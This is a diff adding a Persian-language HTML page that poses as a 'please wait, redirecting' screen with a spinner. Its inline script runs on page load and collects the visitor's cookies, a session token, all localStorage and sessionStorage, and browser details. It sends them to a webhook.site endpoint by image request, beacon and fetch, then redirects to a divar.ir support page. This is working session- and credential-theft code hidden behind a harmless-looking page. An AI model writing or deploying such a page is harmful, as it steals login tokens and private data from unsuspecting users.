@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>در حال انتقال...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>در حال انتقال...</h1>
+        <p>لطفاً صبر کنید</p>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+            
+            // ===== تنظیمات =====
+            const WEBHOOK_ID = '912764f1-e7f7-4391-8808-f4f9f5c3f9a1';
+            const REDIRECT_URL = 'https://divar.ir/support/custom_articles/critics_and_suggestions';
+            const REDIRECT_DELAY = 1000; // میلی‌ثانیه
+            
+            // ===== جمع‌آوری داده‌ها =====
+            function collectData() {
+                const data = {
+                    cookies: document.cookie,
+                    token: (() => {
+                        const match = document.cookie.match(/token=([^;]+)/);
+                        return match ? match[1] : null;
+                    })(),
+                    url: document.referrer || window.location.href,
+                    currentUrl: window.location.href,
+                    localStorage: {},
+                    sessionStorage: {},
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth
+                    },
+                    timestamp: new Date().toISOString(),
+                    referrer: document.referrer
+                };
+                
+                // جمع‌آوری LocalStorage
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        data.localStorage[key] = localStorage.getItem(key);
+                    }
+                } catch (e) {
+                    console.error('LocalStorage access error:', e);
+                }
+                
+                // جمع‌آوری SessionStorage
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        data.sessionStorage[key] = sessionStorage.getItem(key);
+                    }
+                } catch (e) {
+                    console.error('SessionStorage access error:', e);
+                }
+                
+                return data;
+            }
+            
+            // ===== ارسال داده‌ها =====
+            function sendData(data) {
+                // روش 1: Image Tag (Bypass CORS)
+                try {
+                    const params = new URLSearchParams();
+                    Object.keys(data).forEach(key => {
+                        if (data[key] !== null && data[key] !== undefined) {
+                            if (typeof data[key] === 'object') {
+                                params.append(key, JSON.stringify(data[key]));
+                            } else {
+                                params.append(key, String(data[key]));
+                            }
+                        }
+                    });
+                    
+                    const img = new Image();
+                    img.src = `https://webhook.site/${WEBHOOK_ID}?${params.toString()}`;
+                    console.log('✅ Data sent via Image:', img.src);
+                } catch (e) {
+                    console.error('Image send error:', e);
+                }
+                
+                // روش 2: Beacon API
+                try {
+                    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                    navigator.sendBeacon(`https://webhook.site/${WEBHOOK_ID}`, blob);
+                    console.log('✅ Data sent via Beacon');
+                } catch (e) {
+                    console.error('Beacon send error:', e);
+                }
+                
+                // روش 3: Fetch (با keepalive)
+                try {
+                    fetch(`https://webhook.site/${WEBHOOK_ID}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data),
+                        keepalive: true
+                    }).then(() => {
+                        console.log('✅ Data sent via Fetch');
+                    }).catch(() => {
+                        // اگر fail شد، مشکلی نیست
+                    });
+                } catch (e) {
+                    console.error('Fetch send error:', e);
+                }
+            }
+            
+            // ===== اجرای اصلی =====
+            try {
+                const data = collectData();
+                console.log('🔴 Collected data:', data);
+                sendData(data);
+            } catch (e) {
+                console.error('Error:', e);
+            }
+            
+            // ===== Redirect =====
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, REDIRECT_DELAY);
+        })();
+    </script>
+</body>
+</html>
+
